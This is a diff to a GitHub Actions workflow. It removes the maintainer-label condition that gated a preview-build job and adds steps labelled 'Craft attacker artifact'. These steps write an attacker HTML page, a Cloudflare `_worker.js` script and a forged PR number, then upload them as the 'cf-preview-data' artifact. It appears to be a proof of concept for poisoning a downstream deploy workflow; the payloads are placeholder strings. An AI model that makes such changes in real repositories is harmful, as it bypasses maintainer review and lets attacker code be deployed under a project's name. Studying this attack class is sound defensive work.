@@ -5,7 +5,17 @@ on:
 permissions: read-all
 jobs:
   build-preview:
-    if: "contains(github.event.pull_request.labels.*.name, 'docs: deploy-preview')"
     runs-on: ubuntu-24.04
     steps:
-      - run: echo "legit build gated by maintainer label"
+      - name: Craft attacker artifact
+        run: |
+          mkdir -p artifact-payload/public
+          printf '<html><body><h1>ATTACKER-CONTROLLED-PAGE</h1></body></html>\n' > artifact-payload/public/index.html
+          printf 'export default { async fetch() { return new Response("ATTACKER-WORKER-CODE"); } };\n' > artifact-payload/public/_worker.js
+          echo 12345 > artifact-payload/pr_number.txt
+      - name: Upload Artifact
+        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7
+        with:
+          name: cf-preview-data
+          path: artifact-payload/
+          retention-days: 1
